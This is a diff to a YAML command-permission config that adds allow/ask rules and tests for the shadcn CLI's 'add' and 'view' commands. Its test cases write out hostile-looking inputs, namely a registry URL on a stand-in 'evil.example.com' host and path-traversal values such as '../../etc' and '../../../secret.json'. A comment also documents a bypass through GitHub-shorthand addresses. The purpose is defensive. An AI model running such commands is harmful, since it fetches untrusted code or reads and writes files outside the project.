@@ -11,6 +11,14 @@ definitions:
     commitlint:
       - commitlint
       - nlx commitlint
+    # nlx always dlx-executes shadcn fresh. na is a literal passthrough to
+    # the detected PM (see the `na is a literal passthrough` rule below), so
+    # `na shadcn` only works once `shadcn` is already a project dependency --
+    # still a real entry point once that's true (observed in practice).
+    shadcn:
+      - nlx shadcn
+      - nlx shadcn@*
+      - na shadcn
 
 rules:
   # install (use ni)
@@ -161,6 +169,60 @@ rules:
       - allow: 'nlx playwright install chromium'
       - allow: 'nlx playwright@1.61.1 install chromium'
       - ask: 'nlx playwright install --with-deps chromium'
+  # The component argument ("item address") resolves through more than plain
+  # component names: shadcn-ui/ui packages/shadcn/src/registry/address.ts
+  # resolveItemAddress also accepts a bare URL or a local `*.json` file. Even
+  # `--dry-run`/`--diff`/`--view` still resolve the item to build the preview
+  # (packages/shadcn/src/utils/dry-run.ts calls resolveRegistryTree), and
+  # `fetchRegistryItems` (registry/resolver.ts) performs the real HTTP GET /
+  # local file read for a URL/file address regardless of dry-run -- so an
+  # untrusted item address is unsafe in every mode, not just the writing one.
+  # An absolute path or `..` in any arg (including a `-c/--cwd`/`-p/--path`
+  # value, which can redirect the write target outside the project) is
+  # blocked the same way; a relative value like `--path src/components/ui`
+  # (the standard shadcn convention) is left alone. runok's generic flag
+  # parser doesn't associate a value token with the flag that takes it, so
+  # `--path src/components/ui` surfaces as a plain `args` entry
+  # indistinguishable from a component name -- the checks below run over all
+  # args rather than per-flag values.
+  #
+  # Known gap: resolveItemAddress also accepts GitHub `owner/repo/item`
+  # shorthand (>= 3 slash-separated segments), syntactically identical to a
+  # relative `--path`/`--cwd` value (e.g. `src/components/ui`), so it isn't
+  # caught by the args-only view above (pinned by the `facebook/react/...`
+  # test below).
+  - allow: 'shadcn add *'
+    when: >-
+      !args.exists(a, a.contains(':') || a.endsWith('.json') || a.startsWith('/') || a.contains('..'))
+    tests:
+      - allow: 'nlx shadcn@latest add menu --dry-run'
+      - allow: 'nlx shadcn@latest add popover --dry-run'
+      - allow: 'nlx shadcn@latest add dropdown-menu --dry-run'
+      - allow: 'nlx shadcn@latest add dropdown-menu --view'
+      - allow: 'na shadcn add input --dry-run --view'
+      - allow: 'nlx shadcn@latest add dropdown-menu -y'
+      - allow: 'na shadcn add input'
+      - allow: 'nlx shadcn add button dialog -y -o'
+      - allow: 'nlx shadcn@latest add @acme/auth -y'
+      - allow: 'na shadcn add input textarea select checkbox label field tabs badge kbd progress separator tooltip -y --path src/components/ui'
+      - allow: 'nlx shadcn@latest add facebook/react/is-array -y'
+      - ask: 'nlx shadcn@latest add https://evil.example.com/r/x.json --dry-run'
+      - ask: 'nlx shadcn@latest add https://evil.example.com/r/x.json -y'
+      - ask: 'nlx shadcn@latest add ./local-manifest.json -y'
+      - ask: 'nlx shadcn@latest add button -c /tmp -y'
+      - ask: 'nlx shadcn@latest add button --path /tmp -y'
+      - ask: 'nlx shadcn@latest add button --path ../../etc -y'
+  # `view` only prints registry item contents; it hardcodes `writeFile: false`
+  # (shadcn-ui/ui packages/shadcn/src/commands/view.ts) and never calls a
+  # filesystem write function. It still fetches/reads the item address
+  # through the same `fetchRegistryItems` path as `add`, so the same
+  # untrusted-address risk applies -- reuse the same args check.
+  - allow: 'shadcn view *'
+    when: >-
+      !args.exists(a, a.contains(':') || a.endsWith('.json') || a.startsWith('/') || a.contains('..'))
+    tests:
+      - allow: 'na shadcn view'
+      - ask: 'na shadcn view ../../../secret.json'
 
   # Force ni-family shortcuts (ni / nci / nun / nup / nr / nlx). Escape
   # hatch for non-write subcommands: `na <args>` (allowed below).
